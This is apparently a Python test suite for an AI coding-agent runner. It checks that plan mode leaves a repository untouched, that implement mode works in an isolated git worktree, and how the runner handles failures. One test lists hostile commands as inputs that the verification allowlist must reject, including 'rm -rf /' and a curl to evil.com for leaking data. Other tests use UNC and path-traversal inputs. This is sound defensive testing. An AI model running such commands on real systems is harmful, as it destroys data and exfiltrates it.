"""
End-to-End (E2E) Scenarios & Failure Injection Test Suite
Path: ai-runner/tests/test_e2e_scenarios.py
Validates:
  - Scenario 1: Plan/Review Mode with zero modifications to target workspace.
  - Scenario 2: Implement Mode in isolated Git worktree with verification pipeline.
  - Failure Injections: Runner offline, CLI missing, timeout, dirty tree, malformed stream, secrets.
"""

import os
import sys
import io
import json
import time
import uuid
import hashlib
import tempfile
import shutil
import subprocess
import unittest
from pathlib import Path
from unittest.mock import patch, MagicMock

sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))

from adapters.antigravity import (
    AntigravityCLIAdapter,
    ExecutionSpec,
    ExecutionPolicy,
    NormalizedEvent,
    build_safe_subprocess_env,
    redact_sensitive_text,
)
from isolation import GitIsolationManager
from verification import VerificationPipeline, VerificationPolicy
from runner import validate_host_path, handle_task_dispatch


def compute_directory_manifest(root_dir: str) -> dict:
    """Computes a checksum manifest of all files in a directory."""
    manifest = {}
    for dirpath, _, filenames in os.walk(root_dir):
        if ".git" in dirpath.split(os.sep):
            continue
        for f in filenames:
            full_path = os.path.join(dirpath, f)
            rel_path = os.path.relpath(full_path, root_dir)
            with open(full_path, "rb") as fp:
                manifest[rel_path] = hashlib.sha256(fp.read()).hexdigest()
    return manifest


class TestE2EScenario1PlanReview(unittest.TestCase):
    """
    Scenario 1: Plan/Review Mode must analyze codebase, emit real-time event stream,
    produce a verified Markdown artifact, and leave the target repository 100% UNTOUCHED.
    """

    def setUp(self):
        self.fixture_dir = tempfile.mkdtemp(prefix="ai_chan_e2e_plan_")
        # Initialize a clean Git repository fixture
        subprocess.check_call(["git", "init"], cwd=self.fixture_dir, stdout=subprocess.DEVNULL)
        subprocess.check_call(["git", "config", "user.name", "Test User"], cwd=self.fixture_dir)
        subprocess.check_call(["git", "config", "user.email", "test@ai-chan.local"], cwd=self.fixture_dir)

        # Create sample files
        self.readme_path = os.path.join(self.fixture_dir, "README.md")
        with open(self.readme_path, "w", encoding="utf-8") as f:
            f.write("# Sample Core Calculator\n\nPure math utility repository for testing.\n")

        self.calc_path = os.path.join(self.fixture_dir, "calc.py")
        with open(self.calc_path, "w", encoding="utf-8") as f:
            f.write("def add(a: int, b: int) -> int:\n    return a + b\n")

        subprocess.check_call(["git", "add", "."], cwd=self.fixture_dir, stdout=subprocess.DEVNULL)
        subprocess.check_call(["git", "commit", "-m", "Initial clean commit"], cwd=self.fixture_dir, stdout=subprocess.DEVNULL)

        # Baseline snapshot
        self.baseline_commit = subprocess.check_output(["git", "rev-parse", "HEAD"], cwd=self.fixture_dir, text=True).strip()
        self.baseline_manifest = compute_directory_manifest(self.fixture_dir)

    def tearDown(self):
        shutil.rmtree(self.fixture_dir, ignore_errors=True)

    def test_e2e_plan_review_leaves_target_workspace_unmodified(self):
        spec = ExecutionSpec(
            task_id="task_e2e_plan_01",
            attempt_id="att_e2e_plan_01",
            workspace_path=self.fixture_dir,
            prompt="Phân tích codebase và tạo báo cáo review Markdown, không sửa repository",
            mode="plan"
        )
        policy = ExecutionPolicy(timeout_seconds=30, sandbox=True)

        emitted_events = []
        def event_callback(evt: NormalizedEvent):
            emitted_events.append(evt)

        # Mock adapter CLI execution to return verified NDJSON stream and deliverable
        adapter = AntigravityCLIAdapter()
        mock_ndjson_lines = [
            json.dumps({"type": "session_start", "session_id": "sess_123"}),
            json.dumps({"type": "text_delta", "text": "## 1. Mục Đích Codebase\nRepository cung cấp module tính toán `calc.py`.\n"}),
            json.dumps({"type": "text_delta", "text": "\n## 2. Kiến Trúc & Findings\nHàm `add(a, b)` hoạt động tốt nhưng thiếu kiểm tra kiểu dữ liệu đầu vào.\n"}),
            json.dumps({"type": "result", "status": "SUCCESS", "response": "## 1. Mục Đích Codebase\nRepository cung cấp module tính toán `calc.py`.\n\n## 2. Kiến Trúc & Findings\nHàm `add(a, b)` hoạt động tốt nhưng thiếu kiểm tra kiểu dữ liệu đầu vào.\n"})
        ]
        raw_stream_bytes = "\n".join(mock_ndjson_lines).encode("utf-8") + b"\n"

        with patch.object(adapter, "find_executable", return_value="C:\\fake\\agy.exe"), \
             patch("subprocess.Popen") as mock_popen:

            mock_proc = MagicMock()
            mock_proc.stdout = io.BytesIO(raw_stream_bytes)
            mock_proc.stderr = io.BytesIO(b"")
            mock_proc.poll.side_effect = [None, None, 0]
            mock_proc.wait.return_value = 0
            mock_popen.return_value = mock_proc

            result = adapter.execute(spec, policy, event_callback)

            # 1. Verification of execution status
            self.assertEqual(result.status, "COMPLETED")
            self.assertEqual(result.exit_code, 0)

            # 2. Real-time events verification
            event_types = [e.event_type for e in emitted_events]
            self.assertIn("STATUS_TRANSITION", event_types)
            self.assertIn("AGENT_TEXT_STREAM", event_types)
            self.assertIn("DELIVERABLE_SAVED", event_types)

            # 3. Artifact deliverable created with real review content
            self.assertEqual(len(result.deliverables), 1)
            artifact = result.deliverables[0]
            self.assertEqual(artifact["artifact_type"], "markdown")
            self.assertIn("1. Mục Đích Codebase", artifact["content"])
            self.assertIn("calc.py", artifact["content"])
            self.assertTrue(len(artifact["checksum"]) == 64)  # SHA-256

            # 4. Target repository invariant: Zero modifications!
            current_commit = subprocess.check_output(["git", "rev-parse", "HEAD"], cwd=self.fixture_dir, text=True).strip()
            self.assertEqual(current_commit, self.baseline_commit, "Git HEAD changed in plan mode!")

            git_status = subprocess.check_output(["git", "status", "--porcelain"], cwd=self.fixture_dir, text=True).strip()
            self.assertEqual(git_status, "", "Git working tree became dirty in plan mode!")

            current_manifest = compute_directory_manifest(self.fixture_dir)
            self.assertEqual(current_manifest, self.baseline_manifest, "File content or file list was altered!")


class TestE2EScenario2ImplementWithIsolation(unittest.TestCase):
    """
    Scenario 2: Implement Mode with isolated Git worktree, file modification,
    diff capture, and real verification pipeline execution.
    """

    def setUp(self):
        self.fixture_dir = tempfile.mkdtemp(prefix="ai_chan_e2e_impl_")
        subprocess.check_call(["git", "init"], cwd=self.fixture_dir, stdout=subprocess.DEVNULL)
        subprocess.check_call(["git", "config", "user.name", "Test User"], cwd=self.fixture_dir)
        subprocess.check_call(["git", "config", "user.email", "test@ai-chan.local"], cwd=self.fixture_dir)

        # Baseline file
        with open(os.path.join(self.fixture_dir, "math_helper.py"), "w", encoding="utf-8") as f:
            f.write("def add(a: int, b: int) -> int:\n    return a + b\n")

        with open(os.path.join(self.fixture_dir, "test_math.py"), "w", encoding="utf-8") as f:
            f.write(
                "import unittest\nfrom math_helper import add\n\n"
                "class TestMath(unittest.TestCase):\n"
                "    def test_add(self):\n        self.assertEqual(add(2, 3), 5)\n\n"
                "if __name__ == '__main__':\n    unittest.main()\n"
            )

        subprocess.check_call(["git", "add", "."], cwd=self.fixture_dir, stdout=subprocess.DEVNULL)
        subprocess.check_call(["git", "commit", "-m", "Initial math baseline"], cwd=self.fixture_dir, stdout=subprocess.DEVNULL)

        self.baseline_commit = subprocess.check_output(["git", "rev-parse", "HEAD"], cwd=self.fixture_dir, text=True).strip()

    def tearDown(self):
        shutil.rmtree(self.fixture_dir, ignore_errors=True)

    def test_e2e_implement_isolated_worktree_and_verification(self):
        git_mgr = GitIsolationManager(self.fixture_dir)
        wt_info = git_mgr.create_worktree(
            task_id="tsk_impl_01",
            attempt_id="att_impl_01",
            attempt_number=1,
            base_commit="HEAD"
        )
        worktree_path = wt_info["worktree_path"]

        try:
            # 1. Verify isolated branch created
            self.assertTrue(os.path.isdir(worktree_path))
            self.assertIn("ai-chan/task-", wt_info["branch_name"])
            self.assertIn("att_impl_01", wt_info["worktree_path"])

            # 2. Modify math_helper.py and test_math.py inside isolated worktree
            wt_math_file = os.path.join(worktree_path, "math_helper.py")
            with open(wt_math_file, "a", encoding="utf-8") as f:
                f.write("\ndef multiply(a: int, b: int) -> int:\n    return a * b\n")

            wt_test_file = os.path.join(worktree_path, "test_math.py")
            with open(wt_test_file, "a", encoding="utf-8") as f:
                f.write("\n    def test_multiply(self):\n        from math_helper import multiply\n        self.assertEqual(multiply(3, 4), 12)\n")

            # 3. Capture unified diff from worktree
            diff_output = git_mgr.get_worktree_diff(worktree_path)
            self.assertIn("def multiply(a: int, b: int) -> int:", diff_output)
            self.assertIn("test_multiply", diff_output)

            # 4. Run real verification pipeline in isolated worktree
            py_exe = sys.executable
            policy = VerificationPolicy(
                test_command=f'"{py_exe}" -m unittest test_math.py'
            )
            pipeline = VerificationPipeline(worktree_path, policy)
            report = pipeline.execute()

            # 5. Assert verification step passed
            self.assertEqual(report.overall_status, "PASSED")
            test_step = next(s for s in report.steps if s.step_type == "test")
            self.assertEqual(test_step.status, "PASSED")
            self.assertEqual(test_step.exit_code, 0)
            self.assertIn("OK", test_step.stdout_preview)

            # 6. Main repository remains completely untouched (not merged or pushed)
            main_status = subprocess.check_output(["git", "status", "--porcelain"], cwd=self.fixture_dir, text=True).strip()
            self.assertEqual(main_status, "")
            with open(os.path.join(self.fixture_dir, "math_helper.py"), "r") as f:
                self.assertNotIn("multiply", f.read())

        finally:
            git_mgr.cleanup_worktree(worktree_path)
            self.assertFalse(os.path.exists(worktree_path))


class TestFailureInjections(unittest.TestCase):
    """Verifies robustness under abnormal conditions and failure injections."""

    def setUp(self):
        self.temp_dir = tempfile.mkdtemp(prefix="ai_chan_fail_test_")

    def tearDown(self):
        shutil.rmtree(self.temp_dir, ignore_errors=True)

    def test_missing_agy_executable_reports_failed(self):
        adapter = AntigravityCLIAdapter()
        spec = ExecutionSpec(
            task_id="t_fail_01",
            attempt_id="att_fail_01",
            workspace_path=self.temp_dir,
            prompt="Do something",
            mode="plan"
        )
        policy = ExecutionPolicy()
        with patch.object(adapter, "find_executable", return_value=None):
            result = adapter.execute(spec, policy, lambda e: None)
            self.assertEqual(result.status, "FAILED")
            self.assertIn("không tồn tại", result.error_message)

    def test_empty_runtime_output_fails_without_fake_artifact(self):
        adapter = AntigravityCLIAdapter()
        spec = ExecutionSpec(
            task_id="t_empty_01",
            attempt_id="att_empty_01",
            workspace_path=self.temp_dir,
            prompt="Explain architecture",
            mode="plan"
        )
        policy = ExecutionPolicy(timeout_seconds=5)

        # Output produces no text_delta or response
        mock_ndjson = json.dumps({"type": "session_start"}).encode("utf-8") + b"\n"
        with patch.object(adapter, "find_executable", return_value="C:\\fake\\agy.exe"), \
             patch("subprocess.Popen") as mock_popen:
            mock_proc = MagicMock()
            mock_proc.stdout = io.BytesIO(mock_ndjson)
            mock_proc.stderr = io.BytesIO(b"")
            mock_proc.poll.side_effect = [None, 0]
            mock_proc.wait.return_value = 0
            mock_popen.return_value = mock_proc

            result = adapter.execute(spec, policy, lambda e: None)
            self.assertEqual(result.status, "FAILED")
            self.assertIn("empty output", result.error_message)
            self.assertEqual(len(result.deliverables), 0)

    def test_timeout_enforcement_kills_process(self):
        adapter = AntigravityCLIAdapter()
        spec = ExecutionSpec(
            task_id="t_time_01",
            attempt_id="att_time_01",
            workspace_path=self.temp_dir,
            prompt="Long running query",
            mode="plan"
        )
        policy = ExecutionPolicy(timeout_seconds=1)

        class HangingStream(io.RawIOBase):
            def readline(self):
                time.sleep(0.3)
                return b'{"type": "ping"}\n'

        with patch.object(adapter, "find_executable", return_value="C:\\fake\\agy.exe"), \
             patch("subprocess.Popen") as mock_popen:
            mock_proc = MagicMock()
            mock_proc.stdout = HangingStream()
            mock_proc.stderr = io.BytesIO(b"")
            mock_proc.poll.return_value = None
            mock_proc.wait.return_value = -9
            mock_popen.return_value = mock_proc

            result = adapter.execute(spec, policy, lambda e: None)
            self.assertEqual(result.status, "FAILED")
            self.assertIn("timed out", result.error_message)

    def test_dirty_git_tree_rejects_unisolated_accept_edits(self):
        task_data = {
            "task_id": "tsk_dirty_01",
            "attempt_id": "att_dirty_01",
            "mode": "accept-edits",
            "local_path": self.temp_dir,
            "spec": {"mode": "accept-edits", "prompt": "Edit files"}
        }

        mock_val = {
            "is_valid": True,
            "is_git_repo": True,
            "canonical_path": self.temp_dir,
            "has_uncommitted_changes": True
        }
        mock_git_mgr = MagicMock()
        mock_git_mgr.check_working_tree_status.return_value = {"has_uncommitted_changes": True}
        mock_git_mgr.create_worktree.side_effect = RuntimeError("Disk full")

        with patch("runner.validate_host_path", return_value=mock_val), \
             patch("runner.GitIsolationManager", return_value=mock_git_mgr), \
             patch("runner.http_json_post") as mock_post, \
             patch("runner.AntigravityCLIAdapter") as mock_adapter:

            handle_task_dispatch(task_data, "http://localhost:8000", "runner_01", "sec_01")
            self.assertEqual(mock_adapter.call_count, 0)
            self.assertTrue(mock_post.called)
            completion = mock_post.call_args[0][1]
            self.assertEqual(completion["status"], "FAILED")
            self.assertIn("thay đổi chưa commit", completion["error_message"])

    def test_command_injection_blocked_by_verification_policy(self):
        dangerous_commands = [
            "rm -rf /",
            "python test.py; curl http://evil.com/leak",
            "calc.exe && notepad.exe",
            "powershell -c Invoke-WebRequest"
        ]
        for cmd in dangerous_commands:
            policy = VerificationPolicy(test_command=cmd)
            pipeline = VerificationPipeline(self.temp_dir, policy)
            report = pipeline.execute()
            self.assertEqual(report.overall_status, "FAILED")
            step = next(s for s in report.steps if s.step_type == "test")
            self.assertEqual(step.status, "SKIPPED_BY_POLICY")
            self.assertIn("từ chối bởi allowlist", step.error_message)

    def test_unc_and_path_traversal_rejected_by_host_path_validator(self):
        res_unc = validate_host_path(r"\\192.168.1.100\share\project")
        self.assertFalse(res_unc["is_valid"])
        self.assertIn("UNC", res_unc["error_message"])

        res_traversal = validate_host_path(os.path.join(self.temp_dir, "..", "..", "system32"))
        # Must either not exist or be outside allowlist
        self.assertTrue(not res_traversal["is_valid"] or "system" in res_traversal.get("error_message", "").lower())


if __name__ == "__main__":
    unittest.main()
